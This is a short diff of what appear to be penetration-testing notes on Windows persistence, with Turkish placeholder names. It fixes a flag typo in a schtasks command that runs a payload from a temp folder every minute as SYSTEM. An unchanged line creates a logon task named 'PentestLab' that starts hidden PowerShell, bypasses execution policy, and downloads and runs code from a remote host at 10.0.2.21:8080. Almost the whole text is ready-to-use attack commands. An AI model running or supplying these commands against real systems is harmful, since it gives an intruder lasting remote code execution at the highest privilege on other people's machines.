@@ -1,4 +1,4 @@
-schtasks /create /ru SYSTEM /sc MINUTE /MO 1/rn <ismi> /tr "\"C:\\Users\\Default\\AppData\\local\\temp\\<payloadadi>\""
+schtasks /create /ru SYSTEM /sc MINUTE /MO 1/tn <ismi> /tr "\"C:\\Users\\Default\\AppData\\local\\temp\\<payloadadi>\""
 
 schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://10.0.2.21:8080/ZPWLywg'''))'" /sc onlogon /ru System
 
